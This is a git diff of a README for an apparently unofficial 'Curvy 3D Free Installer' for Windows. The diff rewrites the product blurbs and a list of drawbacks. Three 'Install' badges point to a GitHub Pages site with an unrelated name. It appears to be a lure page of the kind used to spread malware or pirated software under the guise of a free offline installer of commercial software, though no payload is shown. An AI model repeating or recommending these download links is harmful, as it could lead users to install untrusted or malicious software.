@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-3D+Sculpting-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Curvy 3D Free Installer** — Curvy 3D is a Windows 3D sculpting application with a unique sketch-to-3D modeling approach. Works without internet access, no account required. Full offline installation.
+**💻 Curvy 3D Free Installer** — Curvy 3D is an accessible 3D sculpting tool for Windows designed for artists who want to create 3D models without mastering complex software. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Curvy 3D](https://img.shields.io/badge/⬇_Install_Curvy%203D-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Curvy 3D](https://img.shields.io/badge/⬇_Install_Curvy+3D-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Curvy 3D
 
-Curvy 3D is a Windows 3D sculpting application with a unique sketch-to-3D modeling approach. Artists sketch shapes and Curvy 3D generates 3D forms, providing an intuitive way to create organic 3D models without traditional box modeling knowledge.
+Curvy 3D is an accessible 3D sculpting tool for Windows designed for artists who want to create 3D models without mastering complex software. Draw curves to define shapes, sculpt with intuitive brushes, and paint directly on 3D surfaces. Curvy 3D is positioned between simple 3D tools and professional sculpting software, making it ideal for concept artists and casual 3D creators.
 
 ---
 
 ## ❌ Problem: Curvy 3D is hard to access
 
-- **Windows Only** — No macOS or Linux version available
-- **Niche Approach** — Sketch-to-3D workflow very different from traditional sculpting apps
-- **Limited Production Features** — Better for concept modeling than production-ready assets
-- **Small Community** — Fewer resources and tutorials than ZBrush or Blender
+- **Windows Only** — No macOS or cross-platform version
+- **Professional Limitations** — Not suitable for high-end production work requiring precision
+- **Community Size** — Smaller community than ZBrush or Blender
+- **Export Quality** — Mesh quality may require cleanup for production pipelines
 
 ---
 
@@ -81,7 +81,7 @@ Curvy 3D is a Windows 3D sculpting application with a unique sketch-to-3D modeli
 
 <div align="center">
 
-[![⬇ Install Curvy 3D](https://img.shields.io/badge/⬇_Install_Curvy%203D-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Curvy 3D](https://img.shields.io/badge/⬇_Install_Curvy+3D-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Curvy 3D is a Windows 3D sculpting application with a unique sketch-to-3D modeli
 
 ---
 
-**Curvy 3D Free Installer** — Curvy 3D is a Windows 3D sculpting application with a unique sketch-to-3D modeling approach. Install without internet connection today!
+**Curvy 3D Free Installer** — Curvy 3D is an accessible 3D sculpting tool for Windows designed for artists who want to create 3D models without mastering complex software. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Curvy 3D](https://img.shields.io/badge/⬇_Install_Curvy%203D-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Curvy 3D](https://img.shields.io/badge/⬇_Install_Curvy+3D-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
